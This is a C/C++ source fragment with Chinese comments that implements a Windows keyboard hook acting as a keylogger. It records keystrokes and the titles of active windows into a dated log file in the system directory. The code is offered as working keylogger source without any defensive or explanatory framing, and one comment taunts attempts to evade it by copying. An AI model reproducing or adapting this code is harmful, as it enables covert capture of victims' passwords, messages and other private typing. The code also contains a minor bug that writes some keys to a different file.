HHOOK g_hHook = NULL;           //全局钩子函数句柄
HWND  g_hLastFocus = NULL;         //活动窗体句柄


//键盘钩子函数
LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	FILE* out;
	SYSTEMTIME sysTm;
	::GetLocalTime(&sysTm);
	int m_nYear = sysTm.wYear;
	int m_nMonth = sysTm.wMonth;
	int m_nDay = sysTm.wDay;

	char filename[100] ={0};//保存文件名

	sprintf(filename,"Key_%d_%d_%d.log",m_nYear,m_nMonth,m_nDay);

	char syspath[MAX_PATH] ={0};

	GetSystemDirectory(syspath,MAX_PATH);

	strcat(syspath,"\\");
	strcat(syspath,filename);
	
	if(nCode<0)
		return CallNextHookEx(g_hHook,nCode,wParam,lParam); 
	
	if(nCode==HC_ACTION)//HC_ACTION表明lParam指向一消息结构
	{     
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN)//判断是否是击键消息
		{   
			DWORD dwCount; 
			char svBuffer[256]; 
			int vKey,nScan; 
			vKey=LOBYTE(pEvt->paramL); 
			nScan=HIBYTE(pEvt->paramL);//扫描码
			nScan<<=16; 
			
			//检查当前窗口焦点是否改变
			HWND hFocus=GetActiveWindow(); 
			if(g_hLastFocus!=hFocus)
			{//保存窗口标题到文件中 
				char svTitle[256]; 
				int nCount; 
				nCount=GetWindowText(hFocus,svTitle,256); 
				if(nCount>0)
				{ 
					out=fopen(syspath,"a+");
					fprintf(out,"\r\n---激活窗口[%s]---\r\n",svTitle);
					fclose(out);
				} 
				g_hLastFocus=hFocus; 
			} 
			
			// Write out key 
			dwCount=GetKeyNameText(nScan,svBuffer,256); 
			if(dwCount)//如果所击键在虚拟键表之中
			{
				if(vKey==VK_SPACE)
				{
					svBuffer[0]=' '; 
					svBuffer[1]='\0'; 
					dwCount=1; 
				} 
				
				if(dwCount==1)//如果是普通键则将其对应的ascii码存入文件
				{   
					BYTE kbuf[256]; 
					WORD ch; 
					int chcount; 
					
					GetKeyboardState(kbuf);
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					/*根据当前的扫描码和键盘信息，将一个虚拟键转换成ASCII字符*/
					if(chcount>0)
					{
						out=fopen(syspath,"a+");
						fprintf(out,"%c",char(ch));
						fclose(out);
					}
				}
				else//如果是Ctrl、Alt之类则直接将其虚拟键名存入文件
				{       
					//你以为用复制我就没办法吗？
					out=fopen(filename,"a+");
					fprintf(out,"[%s]",svBuffer);
					fclose(out);
					if(vKey==VK_RETURN)//回车
					{
						out=fopen(syspath,"a+");
						fprintf(out,"\r\n");
						fclose(out);
					}
					
				} 
			} 
		} 
	} 
	return CallNextHookEx(g_hHook,nCode,wParam,lParam); 
}